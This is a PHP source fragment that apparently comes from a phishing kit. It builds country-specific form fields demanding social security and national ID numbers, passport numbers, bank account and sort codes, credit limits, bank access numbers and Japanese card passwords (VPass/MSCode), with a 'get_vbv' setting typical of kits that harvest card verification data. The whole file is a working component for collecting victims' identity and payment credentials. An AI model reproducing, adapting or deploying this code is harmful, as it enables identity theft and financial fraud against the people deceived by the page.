<?php
switch ($countryname) {

case "Greece":
case "Hong Kong":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="idnum" type="tel" required placeholder="ID number">
                        </div>';
  $card = '';
break;

case "Kuwait":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="civilid" type="tel" required placeholder="Civil ID number">
                        </div>';
  $card = '';
break;

case "Cyprus":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="passport" type="tel" required placeholder="Passport number">
                        </div>';
  $card = '';
break;

case "Saudi Arabia":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="nationalid" type="tel" required placeholder="National ID">
                        </div>';
  $card = '<div style="top:15px;margin-bottom:10px;" class="inputArea">
                            <input id="climit" type="text" maxlength="11" required placeholder="Credit limit (ex: $500)">
                        </div>';
break;

case "Qatar":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="qatarid" type="tel" required placeholder="Qatar ID">
                        </div>';
  $card = '';
break;

case "United States":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="ssn" type="tel" maxlength="11" required placeholder="Social security number">
                        </div>';
  $card = '';
break;

case "Canada":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="sin" type="tel" maxlength="11" required placeholder="Social insurance number">
                        </div>';
  $card = '';
break;

case "Australia":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="osid" type="tel" maxlength="16" required placeholder="OSID number">
                        </div>';
  $card = '<div style="top:15px;margin-bottom:10px;" class="inputArea">
                            <input id="climit" type="text" maxlength="11" required placeholder="Credit limit (ex: $500)">
                        </div>';
break;

case "Thailand":
  $additional = '<div style="top:15px;" class="inputArea">
                            <input id="citizenid" type="tel" maxlength="16" required placeholder="id พลเมือง">
                        </div>';
  $card = '<div style="top:15px;margin-bottom:10px;" class="inputArea">
                            <input id="climit" type="text" maxlength="11" required placeholder="วงเงิน">
                        </div>';
break;

case "New Zealand":
  $additional = '';
  $card = '<div style="top:15px;" class="inputArea">
                            <input id="climit" type="text" maxlength="11" required placeholder="Credit limit (ex: $500)">
                        </div>
                        <div style="top:15px;margin-bottom:10px;" class="inputArea">
                            <input id="bans" type="tel" required placeholder="Bank access number">
                        </div>';
break;

case "India":
  $additional = '';
  $card = '<div style="top:15px;" class="inputArea">
                            <input id="acn" type="text" maxlength="11" required placeholder="Account number">
                        </div>
                        <div style="top:15px;margin-bottom:10px;" class="inputArea">
                            <input id="climit" type="text" maxlength="11" required placeholder="Credit limit (ex: $500)">
                        </div>';
break;

case "Ireland":
case "United Kingdom":
  $additional = '';
  $card = '<div style="top:15px;" class="inputArea">
                            <input id="acn" type="tel" maxlength="15" required placeholder="Account number">
                        </div>
                        <div style="top:15px;margin-bottom: 10px;" class="inputArea">
                            <input id="stc" type="tel" maxlength="10" required placeholder="Sort code">
                        </div>';
break;

case "Japan":
if($setting['get_vbv'] == "on") {
  $additional = '';
  $card = '';
}else{
$additional = '';
  $card = '
<div style="top:15px;" class="inputArea">
                            <input id="webid" type="text" required placeholder="WEB サービス ID">
                        </div>
<div style="top:15px;margin-bottom:10px;" class="inputArea">
                            <input id="cardpass" type="password" required placeholder="パスワード （VPass / MSCode）">
                        </div>';
}
break;

default:
  $additional = '';
  $card = '';
}
?>
